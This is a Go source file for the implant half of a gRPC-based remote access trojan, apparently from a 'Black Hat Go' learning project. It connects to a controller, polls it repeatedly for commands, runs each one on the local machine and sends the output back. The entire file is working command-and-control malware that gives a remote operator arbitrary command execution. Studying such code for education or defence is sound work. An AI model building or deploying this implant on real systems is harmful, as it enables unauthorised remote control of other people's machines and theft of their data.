package main

import (
	"context"
	"flag"
	"github.com/rainer37/go-fun/grpc-rat-black-hat-go/grpcapi"
	log "github.com/sirupsen/logrus"
	"google.golang.org/grpc"
	"os/exec"
	"strings"
	"time"
)

var implantAddr string

func init()  {
	flag.StringVar(&implantAddr, "implantAddr", "localhost:4444", "addr:port listens for implant server")
	flag.Parse()
}

func runCmd(cmdString string) *exec.Cmd {
	tokens := strings.Split(cmdString, " ")
	var c *exec.Cmd
	if len(tokens) == 1 {
		c = exec.Command(tokens[0])
	} else {
		c = exec.Command(tokens[0], tokens[1:]...)
	}
	return c
}

func main()  {
	var opts []grpc.DialOption
	opts = append(opts, grpc.WithInsecure())
	conn, err := grpc.Dial(implantAddr, opts...)
	if err != nil {
		log.Fatal("DIAL", err)
	}
	defer conn.Close()

	client := grpcapi.NewImplantClient(conn)

	ctx := context.Background()
	for {
		var req = new(grpcapi.Empty)
		cmd, err := client.FetchCommand(ctx, req)
		if err != nil {
			log.Error(err)
			time.Sleep(3 * time.Second) // retry fetching
			continue
		}
		if cmd.In == "" {
			time.Sleep(3 * time.Second)
			continue
		}

		go func(command *grpcapi.Command) {
			log.Infof("Running Command: [%s] from %s", command.In, command.Id)
			c := runCmd(command.In)
			buf, err := c.CombinedOutput()
			if err != nil {
				command.Out = err.Error()
			}
			command.Out += string(buf)
			log.Infof("Sending Outputs: [%s] to %s", command.Out, command.Id)
			client.SendOutputs(ctx, command)
		}(cmd)
	}
}